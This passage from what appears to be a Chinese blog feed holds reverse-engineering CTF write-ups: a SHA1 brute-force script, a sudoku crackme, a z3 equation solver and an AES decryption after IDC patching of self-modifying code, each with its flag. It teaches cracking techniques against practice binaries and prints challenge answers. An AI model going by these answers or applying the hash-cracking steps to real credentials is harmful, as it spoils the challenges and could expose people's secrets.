        <content type="html"><![CDATA[<html><head></head><body><h1 id="NewStarCTF-公开赛-week4hash"><a href="#NewStarCTF-公开赛-week4hash" class="headerlink" title="NewStarCTF 公开赛 - week4hash"></a>NewStarCTF 公开赛 - week4hash</h1><p>看题目  考点是hash算法</p><p>直接拖入ida 看啥逻辑</p><p><img src="/2023/02/25/reverse-hash%E6%9A%B4%E7%A0%B4%E5%AE%9E%E4%BE%8B/image-20230225200637257.png" alt="image-20230225200637257"></p><p>跟入4113F2</p><p><img src="/2023/02/25/reverse-hash%E6%9A%B4%E7%A0%B4%E5%AE%9E%E4%BE%8B/image-20230225200713660.png" alt="image-20230225200713660"></p><p>打开MSDN去查看这个模块  看是什么hash</p><p>贴网站 <a href="https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id">https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id</a></p><p><img src="/2023/02/25/reverse-hash%E6%9A%B4%E7%A0%B4%E5%AE%9E%E4%BE%8B/image-20230225200800012.png" alt="image-20230225200800012"></p><p>欧克  是sha1</p><p><img src="/2023/02/25/reverse-hash%E6%9A%B4%E7%A0%B4%E5%AE%9E%E4%BE%8B/image-20230225201037576.png" alt="image-20230225201037576"></p><p><img src="/2023/02/25/reverse-hash%E6%9A%B4%E7%A0%B4%E5%AE%9E%E4%BE%8B/image-20230225201150603.png" alt="image-20230225201150603"></p><p>以一行00 + 00 00 00 分开了</p><p>放入Sublime整理一下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text = [<span class="string">'A2F17ED1C6A8BC31769CDF654DF4B8A937042CB6'</span>, <span class="string">'0CA8A2EDB0C1D34A432A5A4464E0D6ABD847C831'</span>,</span><br><span class="line">        <span class="string">'C359D69F3F08BB920F2C3B51133205533462093E'</span>, <span class="string">'CC5C3FE6E7356A26A134CFF5633349F597C40A9D'</span>,</span><br><span class="line">        <span class="string">'4AC4BB3F27F245BA9178651AA5CDEDCBB2862E2A'</span>, <span class="string">'A01E33F4DCDB6BA1AE9F34A97CF8F6DEEEDF1A8D'</span>,</span><br><span class="line">        <span class="string">'D3AF70912A8C1B22CFDECE071BA36BC4662B58FA'</span>, <span class="string">'9395EAB195D25B676D7D07075D3838A9AC19DF21'</span>,</span><br><span class="line">        <span class="string">'FDB43C5EF76ECDA0C1661D6D199B5BFAC1DB538A'</span>, <span class="string">'DA8E9997A010BE78B20108CE79FEC1FB9C63D8DC'</span>,</span><br><span class="line">        <span class="string">'809DA627F1AD01D65864C376E3179B62D9D74261'</span>, <span class="string">'8F61EE21AC7579626934E0FFB6A62B3D4A82EEC4'</span>,</span><br><span class="line">        <span class="string">'E2A954758FDB61F869998E9788B7B7E48480B832'</span>, <span class="string">'B8E3349B97532B27AA62B8718B68240179158144'</span>]</span><br></pre></td></tr></tbody></table></figure><p>然后兴高采烈找个在线解密网站</p><p>贴一下 网站  还是很好用的   <strong>免费</strong></p><p><a href="https://md5.cn/">https://md5.cn/</a></p><p>哎  妹解出来</p><p><img src="/2023/02/25/reverse-hash%E6%9A%B4%E7%A0%B4%E5%AE%9E%E4%BE%8B/image-20230225201508946.png" alt="image-20230225201508946"></p><p>哥们菜菜   就去找了个暴破脚本</p><p>改一改   跑一下</p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">text = [<span class="string">'A2F17ED1C6A8BC31769CDF654DF4B8A937042CB6'</span>, <span class="string">'0CA8A2EDB0C1D34A432A5A4464E0D6ABD847C831'</span>,</span><br><span class="line">        <span class="string">'C359D69F3F08BB920F2C3B51133205533462093E'</span>, <span class="string">'CC5C3FE6E7356A26A134CFF5633349F597C40A9D'</span>,</span><br><span class="line">        <span class="string">'4AC4BB3F27F245BA9178651AA5CDEDCBB2862E2A'</span>, <span class="string">'A01E33F4DCDB6BA1AE9F34A97CF8F6DEEEDF1A8D'</span>,</span><br><span class="line">        <span class="string">'D3AF70912A8C1B22CFDECE071BA36BC4662B58FA'</span>, <span class="string">'9395EAB195D25B676D7D07075D3838A9AC19DF21'</span>,</span><br><span class="line">        <span class="string">'FDB43C5EF76ECDA0C1661D6D199B5BFAC1DB538A'</span>, <span class="string">'DA8E9997A010BE78B20108CE79FEC1FB9C63D8DC'</span>,</span><br><span class="line">        <span class="string">'809DA627F1AD01D65864C376E3179B62D9D74261'</span>, <span class="string">'8F61EE21AC7579626934E0FFB6A62B3D4A82EEC4'</span>,</span><br><span class="line">        <span class="string">'E2A954758FDB61F869998E9788B7B7E48480B832'</span>, <span class="string">'B8E3349B97532B27AA62B8718B68240179158144'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hashlib.sha1('fla'.encode()).hexdigest())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(text[i]))</span><br><span class="line"></span><br><span class="line">modle = <span class="built_in">list</span>(itertools.product(</span><br><span class="line">    [<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>,</span><br><span class="line">     <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>,</span><br><span class="line">     <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'{'</span>, <span class="string">'}'</span>, <span class="string">'_'</span>, <span class="string">'!'</span>, <span class="string">'@'</span>, <span class="string">'|'</span>],</span><br><span class="line">    repeat=<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">i = -<span class="number">1</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(modle[i])</span></span><br><span class="line">        <span class="built_in">str</span> = <span class="string">''</span>.join(modle[i])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hashlib.sha1(<span class="built_in">str</span>.encode()).hexdigest() <span class="keyword">in</span> text[k].lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'correct: '</span>, <span class="built_in">str</span>)</span><br><span class="line">            <span class="comment"># input()</span></span><br><span class="line">            flag += <span class="built_in">str</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'[-]:'</span> + <span class="built_in">str</span>)</span><br><span class="line">    i = -<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>``</p><p>提交一下  过啦</p><p>Orz   Orz</p><p>（又偷到一招） bushi   又学到一招</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学到了 个 暴破脚本</p><p>然后贴一下itertools  是啥模块</p><p><img src="/2023/02/25/reverse-hash%E6%9A%B4%E7%A0%B4%E5%AE%9E%E4%BE%8B/image-20230225202228811.png" alt="image-20230225202228811"></p><p>好的  本期结束</p><p>感谢观看</p><p>Orz</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-buuctf刷题记录2</title>
      <link href="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
      <url>/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><hr><p><strong>今天你 RE 了嘛？</strong></p><hr><h1 id="GUET-CTF2019-number-game-二叉树-数独"><a href="#GUET-CTF2019-number-game-二叉树-数独" class="headerlink" title="[GUET-CTF2019]number_game | 二叉树,数独"></a>[GUET-CTF2019]number_game | 二叉树,数独</h1><p>先查壳  然后运行看一下</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224155712720.png" alt="image-20230224155712720"></p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224155759651.png" alt="image-20230224155759651"></p><p>然后拖入ida64分析</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224155850454.png" alt="image-20230224155850454"></p><p>跟进4006D6  </p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224160140869.png" alt="image-20230224160140869"></p><p>但是嘞  输入啥都Wrong</p><p> 搞不懂</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224160220692.png" alt="image-20230224160220692"></p><p>跟进4007583</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224160044240.png" alt="image-20230224160044240"></p><p>跟进400807</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224160244450.png" alt="image-20230224160244450"></p><p>跟进400881</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224160449284.png" alt="image-20230224160449284"></p><p>跟进400917</p><p>可以提取出来sudoku</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">14<span class="comment">#2330#1#0#23##3##042##1</span></span><br></pre></td></tr></tbody></table></figure><p>然后 5*5  知道原理直接手解</p><p>这儿给出手解的答案</p><p><code>0421421430</code></p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224160611320.png" alt="image-20230224160611320"></p><p>然后我的解题方法是动调出output</p><p>顺便看下那个Wrong为啥一直触发</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224161238555.png" alt="image-20230224161238555"></p><p>发现过不了是因为   要输入10个0-4的数</p><p>az 哈哈哈  Orz</p><p>我输入的0-9</p><p>待会用之对应sudoku</p><p>就能够得到flag</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224162140973.png" alt="image-20230224162140973"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OUTPUT = 7381940526</span><br></pre></td></tr></tbody></table></figure><p>再步过 得到sudoku填充后的数据</p><p>对应关系</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --&gt; 0421421430</span></span><br><span class="line">对应</span><br><span class="line">0   7</span><br><span class="line">43</span><br><span class="line">28</span><br><span class="line">11</span><br><span class="line">49</span><br><span class="line">24</span><br><span class="line">10</span><br><span class="line">45</span><br><span class="line">32</span><br><span class="line">06</span><br><span class="line"><span class="comment">#然后按 0-9排序即为flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1134240024</span></span><br></pre></td></tr></tbody></table></figure><p><code>flag{1134240024}</code></p><p>提交  过啦</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这题挺好的 </p><p>sudo + 二叉树</p><p>其实理解两个概念很简单的</p><p>这边呢 我是动调解的</p><p>很方便</p><p>Orz</p><h1 id="ACTF新生赛2020-Universe-final-answer-z3"><a href="#ACTF新生赛2020-Universe-final-answer-z3" class="headerlink" title="[ACTF新生赛2020]Universe_final_answer - z3"></a>[ACTF新生赛2020]Universe_final_answer - z3</h1><p>查壳  运行</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224163329142.png" alt="image-20230224163329142"></p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224163404980.png" alt="image-20230224163404980"></p><p>直接拖入ida64 分析</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224164017799.png" alt="image-20230224164017799"></p><p>跟进860 wow  解方程</p><p>那太简单了</p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224164048184.png" alt="image-20230224164048184"></p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">v1 = Int(<span class="string">'v1'</span>)</span><br><span class="line">v2 = Int(<span class="string">'v2'</span>)</span><br><span class="line">v3 = Int(<span class="string">'v3'</span>)</span><br><span class="line">v4 = Int(<span class="string">'v4'</span>)</span><br><span class="line">v5 = Int(<span class="string">'v5'</span>)</span><br><span class="line">v6 = Int(<span class="string">'v6'</span>)</span><br><span class="line">v7 = Int(<span class="string">'v7'</span>)</span><br><span class="line">v8 = Int(<span class="string">'v8'</span>)</span><br><span class="line">v9 = Int(<span class="string">'v9'</span>)</span><br><span class="line">v11 = Int(<span class="string">'v11'</span>)</span><br><span class="line"></span><br><span class="line">s.add(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>)</span><br><span class="line">s.add(<span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -<span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>)</span><br><span class="line">s.add(-<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 * <span class="number">64</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>)</span><br><span class="line">s.add(<span class="number">71</span> * v6 + (v7 * <span class="number">128</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>)</span><br><span class="line">s.add(<span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -<span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>)</span><br><span class="line">s.add(-<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>)</span><br><span class="line">s.add(-<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>)</span><br><span class="line">s.add(<span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>)</span><br><span class="line">s.add(<span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -<span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>)</span><br><span class="line">s.add(<span class="number">99</span> * v11 + -<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -<span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">key = s.model()</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">70</span>, <span class="number">48</span>, <span class="number">117</span>, <span class="number">82</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">55</span>, <span class="number">119</span>, <span class="number">64</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(key[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#F0uRTy_7w@</span></span><br></pre></td></tr></tbody></table></figure><p>运行 输入<code>F0uRTy_7w@</code></p><p><img src="/2023/02/24/reverse-buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/image-20230224164309010.png" alt="image-20230224164309010"></p><p><code>flaga{F0uRTy_7w@_42}</code></p><p>提交一下  过啦</p><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>这道题呢  好像比上一题还简单 </p><p>就考查z3</p><p>当然因为我没分析加密</p><p>好的  本期结束</p><p>感谢观看</p><p>Orz</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-[GWCTF 2019]re3-AES加密</title>
      <link href="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/"/>
      <url>/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="情景再现"><a href="#情景再现" class="headerlink" title="情景再现"></a>情景再现</h1><p>下载先查壳 然后运行一下</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222181808512.png" alt="image-20230222181808512"></p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222181836207.png" alt="image-20230222181836207"></p><p>没啥好看的  拖入ida64分析</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222182024067.png" alt="image-20230222182024067"></p><p>然后也打不开  F5 然后space看下汇编窗口</p><p>显然有问题 需要修复  这儿用到了idc脚本执行</p><p> 不懂去Google   不多赘述了</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222182100619.png" alt="image-20230222182100619"></p><p>从开始的地址按D 转化为data</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222182319379.png" alt="image-20230222182319379"></p><p>shift + F2  打开 内置脚本命令行</p><p>执行脚本Run</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222182444610.png" alt="image-20230222182444610"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line"></span><br><span class="line">static main()</span><br><span class="line">{</span><br><span class="line">    auto addr = 0x402219;</span><br><span class="line">    auto i;</span><br><span class="line">    for(i = 0; i &lt;= 223; ++i){</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^0x99);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222182503987.png" alt="image-20230222182503987"></p><p>然后</p><p>依次按c  （机器语言变汇编） p（创建函数）</p><p>这个call成功修复了</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222182636070.png" alt="image-20230222182636070"></p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222182710225.png" alt="image-20230222182710225"></p><p>跟入40207B   （双击603170发现没有值  应该是个关键值）</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222182810968.png" alt="image-20230222182810968"></p><p>跟进401CF9  </p><p>跟进call  笔者没看懂  后来了解是MD5加密</p><p>这是MD5特征码</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222183247937.png" alt="image-20230222183247937"></p><p>（603120是个标准base64表）</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222182858736.png" alt="image-20230222182858736"></p><p>看不懂我们就分析外面这个call</p><p>这样看着好一些 -</p><p><strong>所以我们可以直接动调得到上文提到的603170的值</strong></p><p><strong>这个值就是这个call的意义所在</strong></p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222183620497.png" alt="image-20230222183620497"></p><p>不会动调的去Google 或者去看我怕前面的文章</p><p>这儿就不赘述了</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222184130813.png" alt="image-20230222184130813"></p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222184241836.png" alt="image-20230222184241836"></p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222184259059.png" alt="image-20230222184259059"><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222184452736.png" alt="image-20230222184452736"></p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222184517008.png" alt="image-20230222184517008"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">603170-</span><br><span class="line">[0xCB, 0x8D, 0x49, 0x35, 0x21, 0xB4, 0x7A, 0x4C, 0xC1, 0xAE, 0x7E, 0x62, 0x22, 0x92, 0x66, 0xCE]</span><br></pre></td></tr></tbody></table></figure><p>跟进这儿个关键call</p><p><img src="/2023/02/22/reverse-GWCTF-2019-re3-AES%E5%8A%A0%E5%AF%86/image-20230222184658126.png" alt="image-20230222184658126"></p><p>经过分析这几个call 发现是AES加密</p><p>然后把MD5后的值传入作为AES的key</p><p>得到6030A0这个数组</p><p>提取这个</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6030A0-</span><br><span class="line">[0xBC, 0x0A, 0xAD, 0xC0, 0x14, 0x7C, 0x5E, 0xCC, 0xE0, 0xB1, 0x40, 0xBC, 0x9C, 0x51, 0xD5, 0x2B, 0x46, 0xB2, 0xB9, 0x43, 0x4D, 0xE5, 0x32, 0x4B, 0xAD, 0x7F, 0xB4, 0xB3, 0x9C, 0xDB, 0x4B, 0x5B]</span><br></pre></td></tr></tbody></table></figure><p>然后 有cipher  有key</p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = long_to_bytes(<span class="number">0xcb8d493521b47a4cc1ae7e62229266ce</span>)</span><br><span class="line">lun = AES.new(key, mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">mi = long_to_bytes(<span class="number">0xbc0aadc0147c5ecce0b140bc9c51d52b46b2b9434de5324bad7fb4b39cdb4b5b</span>)</span><br><span class="line">flag = lun.decrypt(mi)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag{924a9ab2163d390410d0a1f670}</span></span><br></pre></td></tr></tbody></table></figure><p>提交一下  过啦</p><p>Orz</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><hr><p><strong>今天你 RE 了嘛</strong></p><hr><p>这道题 学习到了 ida中怎么运行idc解密脚本（smc）</p><p>然后就是AES动调key and cipher</p><p>得出flag</p><p>好的  本期结束</p><p>感谢观看</p><p>Orz</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
